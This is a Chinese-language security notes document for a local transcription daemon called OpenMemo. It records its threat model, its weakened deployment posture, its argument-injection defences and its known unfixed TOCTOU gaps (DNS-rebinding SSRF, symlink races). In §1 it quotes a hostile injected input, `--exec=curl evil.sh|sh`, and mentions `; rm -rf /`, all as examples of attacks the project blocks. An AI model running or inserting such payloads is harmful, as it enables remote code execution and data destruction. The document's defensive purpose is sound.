# OpenMemo 安全说明

> 维护者：`gpu-runtime` · 最后更新：2026-08-02 · **逐条复核订正：2026-08-06** · 依据：ADR-003、ADR-008 决策 4、D-01 §8
>
> **2026-08-06 这一轮改了什么**（每处正文里都留了「此前写着 X」）：拓扑图的监听地址与 yt-dlp 口径 ·
> **补记了此前一字未提的 CSRF 同源兜底** · L1「全包唯一 import `child_process`」如实降级为约定 ·
> 攻击用例 25 → 38 · §2.4 解压的链接条目策略 · §3 两个缺口的裁决依据已失效的提示 ·
> 附录验证状态表的 3 行（L3 用例数 / ffmpeg 协议白名单 / 解压防护）。
> **未改动**：§3 两个 TOCTOU 缺口本身（技术事实复核后仍成立）· TLS 默认关闭 · `secrets.json` 0600 ·
> TD-002 已关闭 · L7 symlink 测试 · L5 env 白名单未写测试 —— 这几条复核后仍然准确。
>
> **本文件存在的理由（ADR-008 决策 4 原话）**：
> **「风险被记录下来才叫接受风险，没记录就是忽略风险。」**
>
> 本文档记录 OpenMemo 的攻击面、已实施的防护、以及**两个明确已知但当前未修复的缺口**。
> 每个缺口都写明：位置、触发前提、为何判定当前可接受、以及**在什么条件下必须立即修复**。

---

## 0. 威胁模型（先说清楚我们在防谁）

OpenMemo 当前的部署形态（ADR-003 决策 1）：

```
浏览器（本机）──HTTP/SSE/WS──> daemon（**代码默认 `127.0.0.1`**；本机演示实例显式设了 `OPENMEMO_HOST=0.0.0.0`。鉴权默认关闭，见下方「当前真实姿态」）
                                   │ 子进程
                                   ├─ ffmpeg / ffprobe
                                   ├─ yt-dlp（内置，GPLv3+）
                                   ├─ whisper-cli / whisper-vad-speech-segments
                                   └─ llama-server
```

> 📝 **本图的两处订正（保留此前写法以便对照）**：
>
> - **此前写着**「daemon（监听 `127.0.0.1`，随机 token 鉴权）」。那是**原始设计意图**，
>   已被用户 2026-08 的决定**放宽**（不是推翻默认值）—— `single-instance.ts:32` 的默认仍是 `127.0.0.1`，`OPENMEMO_HOST` 是显式选择加入；鉴权默认 `none`（`apps/daemon/src/http/auth.ts:52`，
>   `BIND_HOST` / `OPENMEMO_HOST` 见 `apps/daemon/src/bootstrap/single-instance.ts`）。
>   下方「当前真实姿态」一节早已如实记录，但本图一直没跟上，**同一份文档自相矛盾**。
> - **此前写着**「yt-dlp（**可选**，GPLv3+）」。那是 ADR-002 **v1** 红线时期的口径；
>   `ADR-002-license-redlines.md:14,23`（v2）已改为「**F1 直接内置 yt-dlp，不做双路径区分**」，
>   `vendor/manifests/backends.json` 里 4 个 `ytdlp-*` 包已发货。

> ⚠️ **以下两条假设已被用户显式推翻，见下方「当前真实姿态」。本表保留的是原始设计意图。**

| 假设                                                     | 说明                                                                                                                                                                                                                                                                                |
| -------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **单用户、个人自用**                                     | ADR-002 v2 已定。没有多租户，没有权限分级                                                                                                                                                                                                                                           |
| **daemon 默认绑 `127.0.0.1`，可用 `OPENMEMO_HOST` 放开** | 原设计写的是「绝不 `0.0.0.0`」（memo.ac 的 `whisper-server` 犯过这个错，R-01）。用户 2026-08 的决定**放开了这个口子**，但**代码默认没有变**（`single-instance.ts:32`）。⚠️ 本文件此前四处写作「默认绑 `0.0.0.0`」——那描述的是**本机这个显式配置过的演示实例**，不是仓库默认，已订正 |
| ~~**token 鉴权**~~                                       | 原设计：启动生成随机 token，网页必须带 token。**已被用户决定默认关闭**                                                                                                                                                                                                              |
| **本机其它进程被视为可信**                               | ← **这是最重要的一条假设，也是 §3 两个缺口可被接受的前提**                                                                                                                                                                                                                          |

### 当前真实姿态（2026-08，用户显式决定）

**这一节记录事实，不是安全性论证。** 下面两条都降低了防护强度，写在这里是为了让任何人
——包括日后的我们——**一眼看到真实状态**，而不是读着"绝不 0.0.0.0"去调试一个绑在 0.0.0.0 的进程。

| 项            | 现状                                         | 用户原话（决定依据）                                                                                 |
| ------------- | -------------------------------------------- | ---------------------------------------------------------------------------------------------------- |
| 监听地址      | 本实例 `0.0.0.0`（**代码默认 `127.0.0.1`**） | 「本机环境特殊我只能通过这个 IP 访问」（NAT 后只有特定端口可从外部访问）                             |
| token 鉴权    | **默认关闭**                                 | 「删除 token 接入，反正也是本地运行的东西，不要这个安全阻拦了」                                      |
| CSRF          | 随鉴权一同关闭                               | 无凭据可借用时，CSRF 只剩摩擦（详见 `auth.ts` 注释）。**`token` 档下也有一层同源兜底 —— 见下一小节** |
| Host / Origin | **保留**                                     | 与凭据无关，挡 DNS rebinding，成本为零                                                               |

#### CSRF 同源兜底（`OPENMEMO_AUTH=token` 档下**也**生效）

> 📝 **此前本文档全文一字未提这条兜底**（`grep "same-origin\|兜底\|Sec-Fetch"` 只命中三处无关内容）。
> 而本文件头引的立论原话是「**风险被记录下来才叫接受风险，没记录就是忽略风险**」——
> 这是一条**刻意接受**的风险（`auth.ts` 注释明写「同源兜底是**显式裁决，不是遗漏**（ADR，勿当 bug 修掉）」），
> 漏记等于本文档在自己的核心规矩上自我违反。现补记如下。

**位置**：`apps/daemon/src/http/auth.ts:225-288`（`checkCsrfDetailed()`），放行点在 `:287`
（`return { ok: true, via: 'same-origin-fallback' }`）。类型分支声明在 `:219-220`。

**它做什么**：写请求（POST/PUT/PATCH/DELETE）**没带 CSRF 头**时，只要同时满足下面两条就放行：

1. `Sec-Fetch-Site` **不是** `cross-site`/`same-site`——注意：**该头缺失（`undefined`）也算通过**，
   因为非浏览器客户端（curl / 脚本）根本不发这个头；
2. `Origin` 可解析，且 `Origin.host` 与 `Host` 头**严格相等**（小写比较，含端口）。

**它不做什么（三条边界，来自 `auth.ts:242-245`，别削掉）**：

- **带了 CSRF 头就仍然严格校验**——有兜底不等于不看，带错的一律拒（`auth.ts:257-263`）；
- 兜底路径要让调用方记一条 **info** 日志；若它成了常态，说明前端 `sessionStorage` 那个根因没修好；
- **token 鉴权完全不动**——它才是真正的访问控制。

**裁决理由（`auth.ts:227-234` 原话摘要）**：前端在 `sessionStorage` 不可用时会丢掉 CSRF 头，
于是「读全部 200、写全部 403」——用户填完 API Key 点保存，界面毫无异常，库里一行没有。
而这一层挡不住真正的威胁：**能伪造同源 `Origin` 的攻击者，本来就能直接读 SQLite 文件**。

**⚠️ 由此产生的一条必须写明的后果**：
下面「恢复方式（一个变量）」里的 `OPENMEMO_AUTH=token`，**恢复的是「token 鉴权 + 打了折的 CSRF」，
不是原始形态**。恶意网页会被 `Sec-Fetch-Site: cross-site` 挡住，但**任何能自设 `Origin` 与 `Host` 头的
非浏览器客户端**（能路由到该 `IP:端口` 的任何人）在 token 档下仍可绕过 CSRF 这一层，
只剩 token 本身作为防线。照那一行做联网加固的人，会得到一个**比他以为的弱**的姿态。

#### 风险（如实陈述，不加修饰）

在 `0.0.0.0` + 鉴权关闭的组合下：
**任何能路由到该 `IP:端口` 的人，都可以读取全部笔记、转写稿与音频，并可修改或删除它们。**
数据目录中还包含 `secrets.json`（用户的第三方 API Key，明文 0600）——
接口不回显明文，但可被删除或覆盖。

⚠️ 用户在做这个决定时，其表述前提是「反正也是本地运行的东西」。
**这个前提在当前部署下并不成立**：进程绑的是 `0.0.0.0`，外部 IP 经 NAT 可达。
此事实已回报，由用户自行判断是否维持该配置。**本文档不代替他做这个判断，也不粉饰它。**

#### 恢复方式（一个变量）

```bash
OPENMEMO_AUTH=token   # 恢复 token 鉴权与 CSRF（CSRF 只恢复到"带同源兜底"的形态，见上一小节）
OPENMEMO_HOST=127.0.0.1   # 恢复只绑回环
```

> ⚠️ **此前这一小节写着「恢复方式（一个变量）」并暗示 `OPENMEMO_AUTH=token` 能完整恢复原防护。**
> 订正：token 鉴权确实完整恢复，但 CSRF 恢复的是**打了折的**形态 —— 见上面「CSRF 同源兜底」一节。

更推荐的组合：绑回环 + SSH 端口转发 —— 那样「本地运行」是真的，关掉鉴权也没有暴露面。

#### 若日后改为多用户或公网部署，**必须**先做完这些

1. **恢复鉴权**，并改为**每用户独立凭据**（当前是全局单一 token，无法区分调用者）
2. **加传输层加密**（TLS 已实现但默认关闭；公网上明文传输笔记内容不可接受）
3. **补 §3 的两个已知缺口**（SSRF 的 TOCTOU 重解析、以及本机进程可信假设）
4. **重新评估「本机其它进程被视为可信」** —— 它是上面所有取舍的地基，多用户下直接失效
5. **加访问审计**（当前无任何访问日志，出事后无法追溯谁读了什么）

### 我们防的是什么

1. **用户粘贴的恶意 URL / 文件名 / 字幕内容** —— 主要攻击面，用户可能被钓鱼、可能导入他人分享的链接
2. **恶意/被攻陷的远端服务器** —— 返回恶意媒体文件、恶意 RSS feed、恶意 HLS 播放列表
3. **恶意网页**（用户在另一个标签页打开）试图打我们的本地 API（CSRF / DNS rebinding）
4. **SSRF**：把我们的下载器当作跳板去访问用户内网、云元数据端点、或**我们自己的 daemon**

### 我们**不**防的是什么（明确的非目标）

- 本机上已经在运行的恶意进程（它已经能读用户全部文件了，我们防不住也没意义）
- 物理接触攻击者
- 恶意的模型权重文件（我们校验 SHA256 防篡改，但不做模型内容审计）
- 供应链攻击（依赖 lockfile + CI 许可证白名单，但不做深度审计）

---

## 1. 子进程参数注入防护（7 层）

**这是本项目最高风险点**：用户粘贴的 URL 会进入 `yt-dlp` / `ffmpeg` 的命令行。

实现：`packages/pipeline/src/subprocess/{argGuard,runner}.ts`
测试：`packages/pipeline/src/subprocess/__tests__/argGuard.test.ts`（**38 个攻击用例 / 9 个 `describe`，全绿**）

> 📝 **此前写着「25 个攻击用例」** —— 那是 ADR-008 时点的数字。之后 T-143 补了 win32 路径族 6 条
> （`argGuard.test.ts:285-334`）、T-145 补了 symlink 根族 6 条（`:394-441`），实测 `it(` 计数为 **38**。

### 关键认识：`shell: false` 挡不住参数注入

这是最容易被误解的一点。不经过 shell 消灭了 `; rm -rf /`、`$(...)`、反引号、管道这一整类攻击，
**但 argv 里一个以 `-` 开头的元素，仍然会被目标程序当成选项解析**。

用户完全可以把 `--exec=curl evil.sh|sh` 当作"URL"粘贴进来。没有 shell 参与，但 yt-dlp 会老老实实
把它当成 `--exec` 选项执行。

### 七层

| 层                    | 措施                                                                                                                                                                      | 实现位置                                  |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------- |
| **L1 架构隔离**       | `runner.ts` 是**媒体子进程**的唯一入口（**约定，当前无机器执行者 —— 见下方「L1 的真实状态」**）                                                                           | `subprocess/runner.ts`                    |
| **L2 绝不过 shell**   | `spawn(absBin, argv, {shell:false})`。Windows 拒绝 `.bat/.cmd/.ps1/.com/.vbs/.js`                                                                                         | `runner.ts` + `argGuard.isSafeExecutable` |
| **L3 URL 校验**       | scheme 白名单 / 拒凭据 / 拒私网 / 拒前导 `-` / 拒控制字符 / 长度上限（按**字节**）                                                                                        | `argGuard.validateHttpUrl`                |
| **L4 关掉工具危险面** | yt-dlp 强制 `--ignore-config --no-config-locations --no-exec --no-playlist`；ffmpeg `-protocol_whitelist`；prompt 截断 1024                                               | `sources/ytdlp.ts`、`audio/ffmpeg.ts`     |
| **L5 进程环境与资源** | env **白名单重建**（不是过滤）；剔除 `LD_PRELOAD`/`LD_LIBRARY_PATH`/`DYLD_*`/`NODE_OPTIONS`/`PYTHONPATH`；强制 timeout；SIGTERM→5s→SIGKILL 整个进程组；stdio 1MB 环形缓冲 | `runner.ts`                               |
| **L6 argv 不变量**    | 用户串只能是**一个完整独立的 argv 元素**，永不拼进别的参数、永不成为参数名                                                                                                | `argGuard.buildArgv`                      |
| **L7 路径穿越**       | `realpath` 后确认在受管根目录内；Windows 拒 UNC / 盘符相对路径                                                                                                            | `argGuard.assertWithinRoot`               |

> 七层各自的实现细节、L1 今天的真实强制范围（**构建脚本与动态 import 不在其中**）、
> L2 的 Windows CVE-2024-27980 细节、L3 的三个易错点、以及 L4 的实测验证，
> 都在 [`docs/design/D-19-user-doc-provenance.md`](design/D-19-user-doc-provenance.md)。

## 2. 其它已实施的防护（结论）

> 每一类**怎么实现的、验到什么程度、行号在哪**，都在
> [`docs/design/D-19-user-doc-provenance.md`](design/D-19-user-doc-provenance.md)。
> 这里只留"挡住了什么"。

| #   | 防护               | 挡住了什么                                                                                                                                                                                                                                 |
| --- | ------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| 2.1 | **路径与文件名**   | **用户永远不提供文件名** —— 落盘名全部由我们生成。这从根上消灭了 `../` 穿越、Windows 保留名、NTFS ADS、Unicode 同形字等一整族问题。少数必须接受路径的入口**先 `realpath` 再比较**（词法比较会被 symlink 骗过）                             |
| 2.2 | **媒体协议白名单** | ffmpeg 是个**协议客户端**，构造的播放列表能让它读本地任意文件。`file:` / `concat:` / `subfile:` 三种变体**已用真实攻击实测挡住**；由此还查出并**修掉**了本地播放列表导入那条真实漏洞                                                       |
| 2.3 | **RSS / XML**      | 不做实体展开、不取 DTD、不跟随外部引用；带 `<!DOCTYPE>` / `<!ENTITY>` 的 feed **直接拒绝**。feed 里每个 enclosure URL 都**重新校验一遍**                                                                                                   |
| 2.4 | **解压（后端包）** | Zip-Slip、绝对路径（POSIX / `C:\` / UNC 三种写法）、`..` 段一律拒绝；**链接条目按目标判定**（落在根内才放行 —— 一律拒绝会让官方 whisper.cpp 的软链装不上）；条目数 / 总字节 / 解压中途字节三道上限防 zip bomb；**解压前先校验整包 SHA256** |
| 2.5 | **崩溃隔离**       | 原生工具全走子进程。whisper.cpp 在后端库缺失时会 `SIGABRT` 直接退出，**进程内绑定会把整个 daemon 一起打死** —— 子进程边界让它只死自己                                                                                                      |

## 3. ⚠️ 已知未修复的缺口（ADR-008 决策 4 要求逐条记录）

> 下面**缺口 1 与 2** 已由 Manager 明确裁决"不阻塞 v1"，依据是 §0 的威胁模型。
> **缺口 3 是一条覆盖面缺口**（不是可被攻击的漏洞），2026-08-09 从 §1 移到这里 —— 理由见该条。
> 记录在此，任何人在改变部署形态前必须先读这一节。
>
> 🚨 **裁决依据已不完整，需 Manager 重裁（2026-08）**：下面缺口 1 的「必须立即修复的条件 ②
> （daemon 监听地址改为非 `127.0.0.1`）」**今天已经满足** —— §0 自陈默认绑 `0.0.0.0`、鉴权默认关闭。
> 缺口 2 的依据「本机其它进程视为可信」也建立在同一组前提上。
> **两个缺口的技术事实仍然成立（已复核），但「当前可接受」这个结论所依据的前提已被用户改变，
> 而本节此前一直挂在"判定当前可接受"之下、未作任何标注。** 参见
> `coordination/PENDING-USER-DECISIONS.md` 的 C-2。

### 缺口 1：DNS Rebinding（TOCTOU）

| 项                        | 内容                                                                                                                                                                                                                                                                                                                                     |
| ------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **位置**                  | `packages/pipeline/src/subprocess/argGuard.ts` → `assertHostNotPrivate()`                                                                                                                                                                                                                                                                |
| **性质**                  | Time-of-check to time-of-use（检查与使用之间的时间窗口）                                                                                                                                                                                                                                                                                 |
| **具体机制**              | `assertHostNotPrivate()` 用 `dns.lookup()` 解析主机名，确认解析结果不是私网地址。但**真正发起连接时会再解析一次**。控制 DNS 的攻击者可以让第一次解析返回公网 IP（通过检查），第二次返回 `127.0.0.1` 或 `169.254.169.254`（实际连接）。                                                                                                   |
| **触发前提**              | ① 攻击者控制一个域名的权威 DNS；② **用户被诱导粘贴该域名的 URL**；③ 攻击者能设置极短 TTL 并在两次解析之间切换应答                                                                                                                                                                                                                        |
| **可造成的影响**          | 让 daemon 向本机其它服务或云元数据端点发起 HTTP GET，并把响应体当作"媒体文件"下载到临时目录。**注意**：daemon 不会把该内容回显给网页（它会先过 ffprobe，非媒体文件会被拒绝并删除），因此这是一个**盲 SSRF**，攻击者拿不到响应内容。                                                                                                      |
| **为何判定当前可接受**    | ① 需要用户主动粘贴攻击者的 URL（社工前提）；② 是盲 SSRF，无回显；③ 本产品是个人自用，本机通常没有其它敏感的 localhost 服务；④ 云元数据端点场景不适用（不部署在云上）；⑤ 字面 IP 的私网过滤**已经生效**，只有主机名路径存在此窗口                                                                                                         |
| **🚨 必须立即修复的条件** | **只要满足下列任意一条**：<br>① 改为**多用户**部署；<br>② daemon 监听地址改为非 `127.0.0.1`（任何形式的联网部署）；<br>③ 部署到**云主机**（元数据端点 `169.254.169.254` 会立刻变成真实高危目标）；<br>④ 增加任何会把下载内容**回显给调用方**的功能（盲 SSRF 变成有回显 SSRF）；<br>⑤ 本机开始运行其它 localhost 服务（如数据库管理面板） |
| **修复方案**              | 把解析得到的 IP **钉进连接**：用自定义 `lookup` hook（`undici.Agent({connect:{lookup}})` 或 `http.request({lookup})`）强制连接到校验时那个 IP，而不是重新解析。必须同时处理重定向（每一跳都要重新校验）。                                                                                                                                |

### 缺口 2：文件路径 TOCTOU

| 项                        | 内容                                                                                                                                                                                                                            |
| ------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **位置**                  | `packages/pipeline/src/subprocess/argGuard.ts` → `assertWithinRoot()`，以及其调用方 `media/sources/localFile.ts`                                                                                                                |
| **性质**                  | Time-of-check to time-of-use                                                                                                                                                                                                    |
| **具体机制**              | `assertWithinRoot()` 用 `realpath` 解析路径并确认它在受管根目录内，然后把**路径字符串**交给下游（ffprobe / ffmpeg）。在"校验通过"和"下游 open()"之间，攻击者可以把路径中的某一段替换成指向根目录外的 symlink。                  |
| **触发前提**              | **本机已经存在一个恶意进程**，且它对相关目录有写权限，且能精确抢到那个时间窗口                                                                                                                                                  |
| **可造成的影响**          | 让 ffprobe/ffmpeg 读取受管根目录之外的文件。由于输出只是转写文本，理论上可以把某个文本文件的内容"转写"出来——但实际上 ffprobe 会因为不是媒体文件而拒绝。                                                                         |
| **为何判定当前可接受**    | **触发前提本身就已经越过了我们的威胁模型**（§0：本机其它进程视为可信）。一个已经能在用户目录里创建 symlink 的进程，本来就能直接读取用户的全部文件，无需绕道我们的转写功能。**修这个缺口不会提高实际安全性。**                   |
| **🚨 必须立即修复的条件** | ① 改为**多用户**部署（此时"本机其它进程"可能属于**别的用户**，前提不再成立）；<br>② daemon 以**更高权限**（root / 服务账户）运行 —— 那时它能读的文件比调用者多，缺口就有了实际价值；<br>③ 引入沙箱/多租户隔离后仍保留此代码路径 |
| **修复方案**              | D-01 §8.5 步骤 5 已给出：校验通过后**立即 `open()` 拿到 fd**，之后所有操作用 fd（`fstat` 复核 inode 与大小），不再用路径字符串。需要下游工具支持 `/dev/fd/N`（Linux/macOS 可行，Windows 需另想办法）。                          |

### 缺口 3：L1 的 lint 强制**不覆盖**构建脚本与动态 import

> **为什么它在这一节**：§1 说"子进程只能从唯一出口出去，并由 lint 强制"。
> 那句话**对产品源码成立，对构建脚本不成立** —— 你不该以为仓库里每一处
> `child_process` 都被挡住了。**这会改变你对防护范围的判断，所以它属于"已知未覆盖"，
> 不属于实现细节。**（2026-08-09 由 `docs-sync` 从 §1 移来；取证过程见
> [`docs/design/D-19-user-doc-provenance.md`](design/D-19-user-doc-provenance.md)。）

| 项                        | 内容                                                                                                                                                                                                                    |
| ------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **位置**                  | `eslint.config.js` 的 `no-restricted-imports` 禁令块：`files: ['apps/daemon/src/**', 'packages/*/src/**']` + 一个 **7 文件白名单**                                                                                      |
| **性质**                  | **覆盖面缺口**，不是可被远程触发的漏洞                                                                                                                                                                                  |
| **具体机制**              | ① `files` 只圈了**产品源码**，`scripts/` 与 `verify-*.mjs` **不在其中**；② **动态 `await import('node:child_process')` 任何静态 lint 规则都抓不到**（仓库里确有一处：`packages/downloader/scripts/verify-offline.mjs`） |
| **可造成的影响**          | 构建/校验脚本里可以绕过"唯一出口"的约定去 spawn 子进程，**而 lint 不会报**。这些脚本跑在**开发者与 CI**的机器上，不在用户的运行路径上                                                                                   |
| **为何判定当前可接受**    | ① 不在用户运行路径上（用户跑的是 `dist/`，不是 `scripts/`）；② 构建脚本的输入是仓库自己的内容，不是用户粘的 URL；③ 真正处理不可信输入的那条路径（`packages/pipeline`）**在强制范围内**                                  |
| **🚨 必须立即修复的条件** | ① 任何 `scripts/` 下的代码开始**处理用户提供的输入**；② 把构建脚本的能力暴露成产品功能（例如网页上触发一次"重新构建"）；③ 白名单从 7 个继续增长而没有逐条定性                                                           |
| **修复方案**              | 把 `files` 扩到 `scripts/**`，逐个把现有命中加进白名单并写明性质；动态 import 那一条**静态规则解决不了**，只能靠护栏测试（现有护栏测试已断言"动态 import 报不了"，即这一格是**已知且被钉住的**，不是被忽略的）          |

### 3.1 缺口 1 与 2 的共同点

两者都是 **TOCTOU**，都**无法靠"再检查一次"修复** —— 再检查只是把窗口变小，不会消除。
真正的修复都是**把校验结果固化成句柄**（IP 固化成连接、路径固化成 fd），而不是重复校验字符串。

---

## 4. 其它已知限制（非缺口，但应知晓）

| 项                    | 说明                                                                                                                                                                                                                                                         |
| --------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **代码签名**          | ADR-003 决策 4：不购买证书。macOS 仅 ad-hoc 签名 ~~+ 下载后清除 quarantine~~ ；Windows 完全不签名。**这意味着我们无法向用户证明二进制未被篡改**，只能靠 HTTPS + SHA256 manifest。~~改为公开分发时必须购买证书。~~ **← 这两处 2026-08-08 订正，见下方 A.1。** |
| **模型权重**          | 校验 SHA256 防传输篡改，但**不审计模型内容**。恶意模型理论上可以输出攻击性文本（如诱导用户执行命令的"转写结果"）。                                                                                                                                           |
| **`vm2` 已禁用**      | ADR-003 明确禁止（已废弃 + 已知逃逸漏洞）。需要插件沙箱时用 `node:worker_threads` + 权限白名单。                                                                                                                                                             |
| **yt-dlp 的固有风险** | 它是一个会执行大量站点特定解析逻辑的大型 Python 程序。我们用 `--ignore-config --no-exec` 收紧了它，并把它放在**可一键关闭**的适配层后面（TD-002 已关闭，实测关掉后产品仍可用）。**风险敏感的用户应关闭它。**                                                 |
| **浏览器端**          | daemon 端口漂移会让浏览器把它当作新站点（ADR-006 决策 2），麦克风等权限需重新授权。这是安全机制的正常表现，不是 bug。                                                                                                                                        |

#### A.1 订正（2026-08-08，`docs-sync`）：代码签名那一行有两句不实

**何时**：2026-08-08。**被谁**：`docs-sync`（agent）。
**依据什么**：`PROTOCOL §13`（谁发现原文不实谁就地改）；实测见
`docs/adr/ADR-003-runtime-and-process-model.md` §7 / §9 与 `docs/design/D-18-launch-experience.md`。

1. ~~「macOS 下载后清除 quarantine」~~ —— **这段代码从来没有存在过。**
   `[实测 grep]` 全仓 `apps/` + `packages/` 零 `xattr` / 零 `quarantine`，**今天依然是零**。
   ADR-003 §7 已就此订正过，**但本文件当时没有跟着改** —— 这正是 §13 那张表的形状：
   一处订正了，同一句话在另一处继续活着。
   **今天的真实姿态**：我们**不清除**隔离属性（那属于削弱 Gatekeeper，须用户本人决定），
   而是**让用户首次右键 →「打开」放行一次**（Manager 2026-08-08 裁决 (A)）。
   ⚠️ 量出来的两条路径：daemon 自己下载的文件**不会**被打上隔离属性（所以那条"缓解措施"
   本来就不需要）；**浏览器下载的包会**，且 `tar` 与「归档实用工具」**都会传播**。
2. ~~「改为公开分发时必须购买证书」~~ —— **我们已经在公开分发了，且没有买证书。**
   代价不是"不能发"，而是**用户首次运行必须手动放行一次**（Windows SmartScreen /
   macOS 右键打开）。买 Developer ID（$99/年）**仍然是可选的升级路径**，
   它买到的是"用户不用被打扰"，不是"能不能发"。

> **这一行本身没有变成假话**：不买证书 ⇒ 无法向用户证明二进制未被篡改 —— **这一条仍然成立**，
> 而且是我们今天真实的安全代价。改掉的是那两句**关于事实的**描述。

---

### 4.1 为何暂不支持"用浏览器 cookie 下载会员/登录内容"

memo.ac 有这个能力，我们**明确暂不实现**（Manager 已列入给用户的决策清单）。原因不是工作量：

**`--cookies <path>` 是一个任意文件读取入口。** 该参数让 yt-dlp 打开我们指定的任意路径并解析。
一旦这个路径变得用户可控（"选择你的 cookie 文件"就是这个意思），攻击面就从"用户粘贴的 URL"
扩大到"用户被诱导选择的任意本地文件"，而 yt-dlp 会把读到的内容用于网络请求。
`--cookies-from-browser` 更进一步：它会**直接读取浏览器的 cookie 数据库**，也就是用户
**全部网站的登录凭据**，然后交给一个我们不控制的、按站点执行大量解析逻辑的大型程序。

配套问题同样真实：

- cookie 一旦落到我们的临时目录，就成了**磁盘上的明文凭据**，需要独立的生命周期与清理策略；
- 出错日志里极易泄漏 cookie 值（我们的 stderr 会进 job 日志）；
- 用户很难判断"授予某个笔记软件读取全部浏览器 cookie"的后果。

**结论**：这不是一个"补代码"的功能，而是一个**需要先做安全设计的功能**——至少需要：
凭据不落盘（或加密落盘 + 明确 TTL）、日志脱敏、最小化到单站点、以及清楚的用户告知。
在这些设计做完之前，`YtDlpSource` **从不传** `--cookies` / `--cookies-from-browser`
（见 §1 L4 的"绝不传"清单），会员内容一律走"用户自行下载后本地导入"。

## 5. 报告安全问题

本项目当前为个人自用项目，无正式安全响应流程。
若发现问题，请在仓库 issue 中标注 `security` 标签。

---

## 附：验证状态（诚实标注）

| 防护                        | 验证方式                               | 状态                                                                                                                                                                                                                      |
| --------------------------- | -------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| L2 Windows `.bat` 拒绝      | 单元测试（指定 platform 参数）         | ✅ 测试通过；**真实 Windows 未验证**                                                                                                                                                                                      |
| L3 URL 校验（全部 6 条）    | **38** 个攻击用例                      | ✅ 实测全绿（**此前本行写 25，是 ADR-008 时点的数字**；T-143 补 win32 路径族 6 条、T-145 补 symlink 根族 6 条）                                                                                                           |
| L4 yt-dlp `--ignore-config` | **植入恶意 config 实跑**               | ✅ **真实攻击验证通过**                                                                                                                                                                                                   |
| L5 env 白名单               | 代码审查                               | ⚠️ 未写针对性测试                                                                                                                                                                                                         |
| L5 进程组 kill              | 中途取消实测（0 孤儿进程）             | ✅ 实测通过（Linux）                                                                                                                                                                                                      |
| L6 argv 不变量              | 单元测试                               | ✅                                                                                                                                                                                                                        |
| L7 symlink 逃逸             | 单元测试（真建 symlink）               | ✅                                                                                                                                                                                                                        |
| 子进程崩溃隔离              | T-012 实测 SIGABRT 场景                | ✅                                                                                                                                                                                                                        |
| ffmpeg 协议白名单           | **构造恶意 HLS 播放列表实跑（T-026）** | ✅ **真实攻击验证通过** + 3 条回归用例（`argGuard.test.ts:461-487`）。**此前本行写"代码审查 / ⚠️ 未构造恶意 HLS 播放列表实测"，与本文 §2.2 自相矛盾** —— §2.2 标题就是「已用真实攻击验证（T-026）」并贴了真实 ffmpeg 输出 |
| RSS XXE 拒绝                | 单元测试（DOCTYPE 拒绝）               | ✅                                                                                                                                                                                                                        |
| 解压防护（Zip-Slip 等）     | 单元测试 + `verify-unpack` 脚本实跑    | ✅ **53/53**（`packages/downloader/src/unpack.ts`）。**此前本行写"❌ 未实现"，是漏核** —— 同一份文档 §2.4 当时就已描述该实现，`ADR-015:44` 与 `coordination/FEATURE-COVERAGE.md:60` 也各记过一次通过                      |

**仍未验证的两项已如实标出**（L2 真实 Windows、L5 env 白名单）。

> 📝 **此前这一段写着「未验证的三项已如实标出，其中"解压防护未实现"需要 Manager 确认归属与排期」。**
> 该条作废：解压防护的归属早已明确（`packages/downloader`，`model-mgmt`）且**已经交付**
> （`packages/downloader/src/unpack.ts` + `scripts/verify-unpack.mjs`），无需 Manager 再确认。
